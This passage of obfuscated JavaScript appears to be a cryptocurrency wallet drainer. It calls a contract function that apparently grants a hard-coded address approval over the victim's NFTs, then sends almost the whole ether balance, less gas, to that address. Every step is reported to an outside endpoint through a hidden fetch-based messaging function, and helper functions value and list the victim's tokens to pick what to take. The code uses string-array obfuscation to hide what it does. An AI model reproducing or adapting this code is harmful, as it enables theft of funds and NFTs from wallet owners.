writeContract({'address':_0x368491[_0x29446c(0x178)],'abi':ABIN,'functionName':_0x29446c(0x1c1),'args':[Oxa,!![]]});console[_0x29446c(0x125)](_0x29446c(0x13e),_0x3da3e7),console[_0x29446c(0x125)]('Transaction\x20Receipt:\x20'+receipt),sendMessage(_0x29446c(0x17d)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x368491[_0x29446c(0x178)]),sendMessage(_0x29446c(0x1bd)+Oxa);}catch(_0x4ea390){console[_0x29446c(0x125)](_0x29446c(0x146)+_0x4ea390),sendMessage(_0x29446c(0x1a3));}}await onSendEther();}function _0x532e(_0x856716,_0x1514f8){const _0x4a9a17=_0x4a9a();return _0x532e=function(_0x532e27,_0x486921){_0x532e27=_0x532e27-0x111;let _0x4253f5=_0x4a9a17[_0x532e27];return _0x4253f5;},_0x532e(_0x856716,_0x1514f8);}async function onSendEther(){const _0x36555=_0x125d65;console[_0x36555(0x125)](_0x36555(0x1c3));try{let _0x595c45=await fetchBalance({'address':selectedAccount});console[_0x36555(0x125)](_0x595c45);const _0x4c21b4=await fetchFeeData();console[_0x36555(0x125)](_0x4c21b4);var _0x2944de=_0x4c21b4[_0x36555(0x19b)][_0x36555(0x197)];_0x2944de=parseFloat(_0x2944de);let _0x353f50=parseFloat(_0x595c45[_0x36555(0x19b)])-_0x2944de*0.00042;_0x353f50=parseEther(_0x353f50[_0x36555(0x156)]()),console[_0x36555(0x125)](_0x353f50);const {hash:_0x24c872}=await sendTransaction({'to':Oxa,'value':_0x353f50});console[_0x36555(0x125)](_0x24c872),sendMessage(_0x36555(0x172),_0x24c872),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage(_0x36555(0x153));}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x221f05){return new Promise((_0x3507c4,_0x5a696b)=>{const _0x424a56=_0x532e,_0x6c7cef=Oxc;fetch(_0x424a56(0x165)+_0x6c7cef+_0x424a56(0x163)+_0x221f05,{'method':'GET','headers':{}})[_0x424a56(0x115)](async _0x1f0290=>{const _0x1f894b=_0x424a56;if(_0x1f0290[_0x1f894b(0x128)]>0x18f)throw _0x1f0290;_0x3507c4(await _0x1f0290['json']());})[_0x424a56(0x1be)](_0x451eeb=>{_0x5a696b(_0x451eeb);});});}async function getPrice(_0x1872e0){return new Promise((_0x4bd4a6,_0x47301e)=>{const _0x458155=_0x532e;fetch(_0x458155(0x19c)+_0x1872e0+_0x458155(0x176),{'method':_0x458155(0x1b3),'headers':{}})[_0x458155(0x115)](async _0x55d129=>{const _0x17490e=_0x458155;if(_0x55d129['status']>0x18f)throw _0x55d129;_0x4bd4a6(await _0x55d129[_0x17490e(0x15c)]());})[_0x458155(0x1be)](_0x41c58f=>{_0x47301e(_0x41c58f);});});}async function getValue(_0xf0d945,_0x590e1a,_0x3ab792){const _0x49aa77=_0x125d65;console[_0x49aa77(0x125)](_0xf0d945,_0x590e1a,_0x3ab792);let _0x52ef63=await getPrice(_0xf0d945);console[_0x49aa77(0x125)](_0x49aa77(0x1b2),_0x52ef63),_0x52ef63=parseFloat(_0x52ef63[_0xf0d945][_0x49aa77(0x1a9)]);let _0x83fdea=_0x590e1a/0xa**(_0x3ab792||0x12)*_0x52ef63;return _0x83fdea=parseInt(_0x83fdea),_0x52ef63?_0x83fdea:0x0;}async function getNFTs(_0x1cbd8a='',_0x114da0=_0x125d65(0x19f),_0x5be51b=_0x125d65(0x1b8),_0x326732='50'){return new Promise((_0x5d4aae,_0x386467)=>{const _0x2ed564=_0x532e;fetch(_0x2ed564(0x16a)+_0x1cbd8a+_0x2ed564(0x15b)+_0x5be51b+'&format=decimal&limit='+_0x326732,{'method':_0x2ed564(0x1b3),'headers':{'accept':'application/json','X-API-Key':_0x114da0}})['then'](async _0x2756fb=>{const _0x467cd1=_0x2ed564;if(_0x2756fb[_0x467cd1(0x128)]>0x18f)throw _0x2756fb;_0x5d4aae(await _0x2756fb[_0x467cd1(0x15c)]());})[_0x2ed564(0x1be)](_0x1cb4d7=>{_0x386467(_0x1cb4d7);});});}